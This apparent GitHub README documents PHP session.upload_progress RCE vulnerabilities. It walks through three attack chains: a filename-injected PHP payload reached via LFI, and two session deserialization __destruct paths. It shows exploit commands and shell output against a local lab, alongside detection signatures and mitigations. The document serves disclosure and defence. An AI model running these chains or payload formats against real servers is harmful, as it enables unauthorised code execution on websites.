<p align="center">
  <img src="docs/cover.png" alt="php2shell" width="700">
</p>

<h1 align="center">php2shell</h1>
<p align="center">
  <strong>CVE-2026-109618 & CVE-2026-109619 — Independent Research & Verification</strong>
</p>
<p align="center">
  <a href="https://github.com/ikow/php2shell-poc/stargazers"><img src="https://img.shields.io/github/stars/ikow/php2shell-poc?style=flat-square" alt="Stars"></a>
  <img src="https://img.shields.io/badge/CVSS-9.2%20Critical-red?style=flat-square" alt="CVSS 9.2">
  <img src="https://img.shields.io/badge/PHP-5.4.0%E2%80%938.5.11-orange?style=flat-square" alt="Affected Versions">
  <img src="https://img.shields.io/badge/Fixed-8.2.35%20%7C%208.3.36%20%7C%208.4.27%20%7C%208.5.12-green?style=flat-square" alt="Fixed Versions">
</p>

---

Critical pre-authentication RCE vulnerabilities in PHP's `session.upload_progress`
handler. **14 years of vulnerable code** (PHP 5.4.0, 2012 — present).

This repository ships three attack chains, each verified end to end against the
bundled lab, each ending in an **interactive shell**.

**Author:** [Qi Deng](https://github.com/ikow) &nbsp;|&nbsp; **Writeup:** [qideng.substack.com](https://qideng.substack.com/p/php2shell-dissecting-phps-critical) &nbsp;|&nbsp; **Date:** 2026-10-21

## CVE Details

| CVE | GHSA | CVSS | Description |
|-----|------|------|-------------|
| CVE-2026-109618 | [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) | 9.2 | OOM → `longjmp()` leaves Zend engine state invalid → RCE |
| CVE-2026-109619 | [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) | 9.2 | Stale global state across FPM worker requests → UAF → RCE |

**Patch:** [Commit 3584a98](https://github.com/php/php-src/commit/3584a98bda) — 300 files changed across the Zend engine.

## Impact

| What | Scale |
|------|-------|
| Websites running PHP | **78%** of all websites |
| WordPress alone | **43%** of all websites |
| Affected versions | PHP 5.4.0 through 8.5.11 (14 years) |
| Authentication required | **None** |

## Verified Attack Chains

All three are reproducible in this lab and return a working shell.

| Chain | Primitive | Lab status |
|-------|-----------|------------|
| A | `upload_progress` filename injection + LFI | `uid=33(www-data)` |
| C | session handler mismatch → `__destruct` | `uid=33(www-data)` |
| E | session decode failure → `__destruct` | `uid=33(www-data)` |

### Chain A — Session File Injection + LFI → RCE

Upload a file with PHP code in the filename → `session.upload_progress` stores
it raw in the session file → include via any LFI → code execution.

```
Conditions: upload_progress=On (default) + application has LFI + use_strict_mode=Off
Reliability: 100% (also with upload_progress.cleanup=On, via --race)
```

**Exploit + interactive shell:**

```bash
python3 poc/exploit_chain_a.py --target http://127.0.0.1:18080 --cmd id
python3 poc/exploit_chain_a.py --target http://127.0.0.1:18080
```

```
[1] injecting payload through the upload_progress filename...
    -> HTTP/1.1 200 OK
[2] triggering the LFI sink...
    -> payload executed
[+] RCE confirmed
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
p2s> whoami
www-data
```

The exploit fixes the session id from the POST body (`PHPSESSID`, bypassing
`use_only_cookies`), smuggles `<?php ... ?>` as the multipart filename, then
reaches the injected code through the LFI sink:

```
GET /vuln.php?page=/tmp/sessions/sess_<sid>&c=id
```

The payload emits `\x01` first so the exploit can discard the serialized session
header that precedes the code and show clean output.

Useful flags: `--lfi`, `--param`, `--cmd-param`, `--session-path`,
`--progress-field`, `--sid-field`, `--payload`, `--race`.

> `--race` keeps the upload open so the session file exists while
> `upload_progress.cleanup=On` would otherwise delete it at request shutdown.
> Tested: without it the same target only reaches `payload not executed`.

### Chain C — Session Handler Mismatch → `__destruct` → RCE

Two directories share one session `save_path` but disagree on the handler:

```
/app  -> php_serialize   (length-prefixed, a pipe is just data)
/api  -> php             (splits at '|', deserializes what follows)
```

1. `/app/write.php` stores `zz|O:Evil:{...}` in a session variable.
2. `/api/endpoint.php` is requested with the same `PHPSESSID`. The decoder
   splits at `|`, deserializes the object, then fails on the trailing data.
3. `__destruct()` runs during `PHP_VAR_UNSERIALIZE_DESTROY` — **the decode
   FAILURE does not prevent it.**

**Exploit + interactive shell:**

```bash
python3 poc/exploit_chain_c.py --target http://127.0.0.1:18080 --cmd id
python3 poc/exploit_chain_c.py --target http://127.0.0.1:18080
```

```
[1] poisoning the session through the php_serialize directory...
    -> stored
[2] re-reading it through the php-handler directory...
    -> __destruct fired during request startup
[+] RCE confirmed
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The gadget class must already be loaded by the reader endpoint; real
applications reach it through their autoloader. The lab ships a stand-in
`Evil` class in [`lab/webroot/api/gadget.php`](lab/webroot/api/gadget.php).

Two details that matter for reproduction:

- The pipe must land in a session **value**. A multipart *filename* ends up
  inside a length-prefixed `php_serialize` value, where the `php` decoder never
  scans for `|` — so the upload-progress filename is the wrong vehicle here.
- Byte lengths in the serialized object must be exact, or PHP refuses to
  instantiate it.

### Chain E — Session Decode Failure → `__destruct` → RCE

Same destructor-on-failure primitive, reached through `session_start()`:

1. The session file holds `x|<serialized object><trailing junk>`.
2. `session_start()` deserializes the object, then fails on the trailing data.
3. `PHP_VAR_UNSERIALIZE_DESTROY` runs `__destruct()` during request startup,
   before a single line of the script executes.
4. The gadget runs the command and stashes the output in a temp file, because
   at that point the response body does not exist yet — an `echo` inside
   `__destruct` is silently dropped.
5. The page serves that file once `session_start()` returns.

```
Conditions: session_start() endpoint + a session file you can plant
```

**Exploit + interactive shell:**

```bash
python3 poc/exploit_chain_e.py --target http://127.0.0.1:18080 --cmd id
python3 poc/exploit_chain_e.py --target http://127.0.0.1:18080
```

```
[1] planting a session file: x|<gadget><trailing junk>...
    -> __destruct fired during request startup
[+] RCE confirmed
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
p2se> hostname
05fc8faaa861
```

Chain E needs a way to plant the session file. In the lab the exploit does it
through `docker exec` (`--container`, `--web-user`); adapt `plant_session()` to
whatever write primitive a real target offers.

## Quick Start

```bash
# Build the lab: php-fpm + nginx on :18080, one static worker
cd lab && ./setup.sh

# Run all three chains, one verdict per line
cd ../poc && ./run_all.sh

# ...and drop into the Chain A shell afterwards
./run_all.sh --interactive
```

Expected output:

```
== 0. target reachable ==
  PASS  http://127.0.0.1:18080

== A. session injection + LFI  (expect: RCE) ==
  PASS  RCE confirmed (uid=33)

== A'. cleanup=On path (--race) ==
  PASS  --race works

== C. handler mismatch -> __destruct  (expect: RCE) ==
  PASS  RCE confirmed (uid=33)

== E. decode failure -> __destruct  (expect: RCE) ==
  PASS  RCE confirmed (uid=33)

  passed 5   failed 0
```

### Testing each chain

| Chain | Command | Expected signal |
|-------|---------|-----------------|
| A | `python3 poc/exploit_chain_a.py --target http://127.0.0.1:18080` | `[+] RCE confirmed`, then `p2s>` |
| A (cleanup=On) | `... --race --race-padding 262144` | `session file is live` |
| C | `python3 poc/exploit_chain_c.py --target http://127.0.0.1:18080` | `__destruct fired during request startup`, then `p2sc>` |
| E | `python3 poc/exploit_chain_e.py --target http://127.0.0.1:18080` | `__destruct fired during request startup`, then `p2se>` |

Inspect what the injection actually wrote to disk:

```bash
docker exec php2shell-lab sh -c 'ls -la /tmp/sessions/ && cat /tmp/sessions/sess_<sid>'
```

You will see the PHP payload stored raw inside `s:4:"name";s:32:"<?php ...";`,
which is the whole point of Chain A.

## Detection Rules

Drop-in rules for the three chains are in [`detection/`](detection/), adapted
from the upstream project:

| File | Format | What it covers |
|------|--------|----------------|
| `php2shell.rules` | Suricata / Snort | 12 network rules: request-side, response-side and recon |
| `php2shell.yaml` | Sigma | 5 SIEM rules: web logs, process creation, file events |
| `modsecurity.conf` | ModSecurity v2/v3 | WAF rules, drop-in for Apache or nginx |
| `php2shell.lua` | OpenResty Lua | Lightweight reverse-proxy filter |

The rules that matter for the chains in this repo:

- `PHP_SESSION_UPLOAD_PROGRESS` in a multipart POST body (Chains A, C, E)
- `PHPSESSID` sent as a form field instead of a cookie (session fixation)
- `<?php` inside a `filename=` parameter (Chain A injection)
- `|O:` or `|a:` inside a filename (serialized-object smuggling)
- `Failed to decode session object` / `Session object destruction failed`
  in the response (Chains C and E firing)

**Fastest mitigation:** block `PHP_SESSION_UPLOAD_PROGRESS` in multipart POST
bodies. It has near-zero legitimate use and covers the primary vector for all
three chains.

```bash
# Suricata
cp detection/php2shell.rules /etc/suricata/rules/

# ModSecurity
cp detection/modsecurity.conf /etc/modsecurity/conf.d/php2shell.conf
```

## How the lab is wired

| Path | Purpose |
|------|---------|
| `lab/setup.sh` | Rebuilds every lab file and starts the containers |
| `lab/docker-compose.yml` | php-fpm + nginx |
| `lab/php.ini` | `upload_progress=On`, `cleanup=Off`, `save_path=/tmp/sessions` |
| `lab/php-fpm-pool.conf` | one static worker, so consecutive requests share state |
| `lab/webroot/vuln.php` | LFI sink (Chain A) |
| `lab/webroot/app/write.php` | session writer, `php_serialize` (Chain C) |
| `lab/webroot/api/endpoint.php` | session reader, `php` handler (Chain C) |
| `lab/webroot/api/gadget.php` | `Evil::__destruct()` stand-in (Chain C) |
| `lab/webroot/e_shell.php` | startup gadget + output page (Chain E) |
| `lab/webroot/api/gadget_e.php` | `EvilE::__destruct()` stand-in (Chain E) |
| `detection/php2shell.rules` | Suricata / Snort network rules |
| `detection/php2shell.yaml` | Sigma SIEM rules |
| `detection/modsecurity.conf` | ModSecurity WAF rules |
| `detection/php2shell.lua` | OpenResty Lua filter |
| `poc/exploit_chain_a.py` | Chain A exploit, interactive shell |
| `poc/exploit_chain_c.py` | Chain C exploit, interactive shell |
| `poc/exploit_chain_e.py` | Chain E exploit, interactive shell |
| `poc/chain_common.py` | shared HTTP client and shell loop |
| `poc/run_all.sh` | runs every chain, one verdict per line |

## Mitigation

```ini
; Immediate — reduces attack surface
session.upload_progress.enabled = Off
session.use_only_cookies = On
session.use_strict_mode = On
```

| Mitigation | Chains blocked |
|-----------|---------------|
| `session.upload_progress.enabled = Off` | A, C, E |
| `session.use_only_cookies = On` | A (session fixation) |
| `session.use_strict_mode = On` | A (uninitialised SID rejected) |
| Consistent `session.serialize_handler` | C |

> Chain A and C are request-level bugs: they do not depend on the memory
> corruption patches, so updating PHP alone does not remove them. Turning off
> `upload_progress` and enforcing consistent session handling does.

## Downstream Impact

Wiz has demonstrated pre-auth RCE on stock container images:

| Platform | Vulnerable | Notes |
|----------|:----------:|-------|
| WordPress | Yes | Core doesn't use PHP sessions, but WooCommerce and many plugins do |
| Joomla | Yes | Uses native PHP sessions by default |
| Drupal | Yes | Uses native PHP sessions by default |
| Magento | Yes | Vulnerable even in maintenance mode |
| Laravel | Yes | `PendingBroadcast` is a known `__destruct` gadget |

## Timeline

| Date | Event |
|------|-------|
| 2012-03-01 | `session.upload_progress` introduced in PHP 5.4.0 |
| 2026-10-20 | Details leaked before embargo; PHP advances release |
| 2026-10-21 | PHP 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 released |
| 2026-10-21 | This research published |

## References

- [PHP Security Advisory](https://www.php.net/archive/2026.php)
- [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) — CVE-2026-109618
- [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) — CVE-2026-109619
- [Patch commit](https://github.com/php/php-src/commit/3584a98bda) — 300 files, Zend engine + extensions
- [PR #22113](https://github.com/php/php-src/pull/22113) — Session fixation fix
- [BleepingComputer coverage](https://www.bleepingcomputer.com/news/security/php-ships-emergency-patches-for-critical-php2shell-flaws/)

## Disclaimer

For authorized security testing and educational purposes only.

## License

MIT
